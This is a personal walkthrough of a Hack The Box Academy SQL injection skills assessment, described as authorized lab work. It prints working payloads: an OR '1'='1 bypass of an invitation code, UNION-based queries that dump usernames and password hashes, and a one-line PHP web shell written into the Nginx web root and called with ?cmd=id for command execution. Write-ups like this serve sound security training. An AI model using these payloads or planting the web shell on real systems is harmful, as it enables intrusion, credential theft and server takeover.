# HTB SQL Injection Fundamentals — Skills Assessment

## Overview

This write-up contains my personal notes from the **SQL Injection Fundamentals** skills assessment on Hack The Box Academy.

The assessment combines several techniques that were covered throughout the module, including:

- SQL injection identification
- Authentication and registration bypass
- Burp Suite request manipulation
- UNION-based SQL injection
- Database enumeration
- Table and column enumeration
- Extracting database information
- Reading server configuration files
- File writing through SQL injection
- Understanding Nginx web roots
- Remote command execution

> **Disclaimer:** All testing described here was performed against an authorized Hack The Box lab environment. These techniques should only be used on systems where you have explicit permission to test.

---

## 1. Connecting to the Target

After spawning the target, I initially tried accessing the IP address directly using HTTP.

The server returned a `400 Bad Request`.

Looking at the behavior of the target, it was expecting an HTTPS connection on port 443. Therefore, instead of:

''text
http://TARGET_IP

After switching to HTTPS, the application loaded correctly


2. Investigating the Login

The application presented a login page, but I didn't have valid credentials.

Since the module was focused on SQL injection, I first considered whether the login functionality could be vulnerable.

I tested the username and password fields with SQL injection techniques, but the initial attempts did not bypass authentication.

The application continued returning an invalid-credentials response.

Rather than spending too much time on the login page, I moved to the registration functionality.


3. Bypassing the Invitation Code

The registration page required an invitation code.

The browser-side validation made it difficult to directly enter an arbitrary value, so I used Burp Suite to intercept the registration request.

Once the request was captured, I could modify the parameters before sending them to the server.

I tested SQL injection against the invitation-code parameter.

One of the successful approaches was based on:

' OR '1'='1

The important part here was that I was modifying the actual HTTP request rather than relying on the restrictions imposed by the web page.

After sending the modified request, the server accepted the registration and returned an account-created response.

I could then continue into the application.

4. Finding an SQL Injection Point

After logging in, I found a conversation/search functionality.

This was interesting because search functionality commonly sends user-controlled input to a backend database query.

I started testing the input to determine whether it was injectable.

One of the first things I wanted to determine was the number of columns returned by the underlying query.

I used a UNION-style test similar to:

SELECT 1,2,3,4

The response reflected values from the query, which indicated that the underlying query was working with four columns.

I also noticed that some of the returned values were visible in specific positions of the application's response.


5. Understanding the Query Structure

Based on the application's behavior, I created a rough idea of what the backend query might look like:

SELECT message
FROM msgdb
WHERE (user='admin' AND data LIKE '%search%');

The exact backend implementation isn't visible to us, so this is an inferred structure based on how the application responds.

The important observation was that the input appeared to be placed inside a quoted value and surrounded by parentheses.

Therefore, the injection needed to escape the existing SQL syntax before introducing a UNION query.

A successful test looked conceptually like:

') UNION SELECT 1,2,3,4 -- -

The important discovery here was that cn') allowed the original expression to be closed before adding the UNION statement.

Once the UNION query started working, I could use the reflected columns to retrieve information from the database.


6. Identifying the Current Database

After confirming the UNION injection, I started enumerating information about the database.

The first things I wanted to determine were:

Current database
Database version
Database tables
Table columns
Relevant user information

')UNION SELECT 1,2,database(),4 

Finding the current database gave me the name:

chattr

This was useful because I could now focus my enumeration on the database belonging to the application.


7. Enumerating Tables

I then queried the database metadata to identify the available tables.

The information_schema database provides metadata about databases, tables, columns, and other database objects.

Conceptually, the query was:

SELECT table_name
FROM information_schema.tables
WHERE table_schema='chattr';

The results showed several tables.

One table immediately stood out because the objective involved finding user credentials:

users


8. Enumerating Columns

Next, I inspected the columns belonging to the users table.

The goal was to determine which columns contained useful information, particularly:

Username
Password/hash
Other account information

After identifying the relevant columns, I could construct a UNION query that returned the username and password hash.
') UNION SELECT 1,2,username,password from Users-- -
This allowed me to retrieve the hash associated with the administrative account.

9. Checking secure_file_priv

At this point, I wanted to determine whether the database account had permission to interact with files on the server.

For MySQL, the secure_file_priv setting is particularly important because it can restrict file operations.

I queried the global variables:

SELECT variable_name, variable_value
FROM information_schema.global_variables
WHERE variable_name='secure_file_priv';

The returned value was:

NULL

This indicated that the usual secure_file_priv directory restriction was not configured.

That was an important finding because it suggested that file operations could potentially be used depending on the database user's privileges.

10. Finding the Nginx Web Root

My first attempt at writing a file to:

/var/www/html

didn't work as expected.

The reason was that the target was running Nginx, so I couldn't simply assume that /var/www/html was the directory from which this application was being served.

I therefore looked at the Nginx configuration.

The main configuration file was:

/etc/nginx/nginx.conf

From the configuration, I found that additional configuration was being loaded from:

/etc/nginx/sites-enabled/default

Inspecting that configuration revealed the application's actual document root:

/var/www/chattr-prod

This explained why my earlier attempt using /var/www/html wasn't being served by the application.

11. File Writing and Web Shell

After identifying the correct web root, I could use the file-writing capability available through the SQL injection to place a PHP file inside the application's document root.

The file was a simple PHP command-execution script.

For example, the basic idea was:

<?php
system($_GET['cmd']);
?>

Once the file was accessible through the web server, I tested it with a harmless command.

For example:

/shell.php?cmd=id

The response showed the user under which the web application was executing.

This confirmed that the SQL injection had progressed from database-level access to command execution on the underlying server.

12. Retrieving the Flag

With command execution working, the final task was to locate the flag file.

I first moved around the filesystem and checked the root directory.

The target flag file was located there:

/flag__.txt

I then used the web shell to read the file contents.

The returned value was the flag required by the assessment.



##Tools Use
Hack The Box Academy
Burp Suite
Browser Developer Tools
SQL injection techniques
MySQL information_schema
Nginx configuration inspection
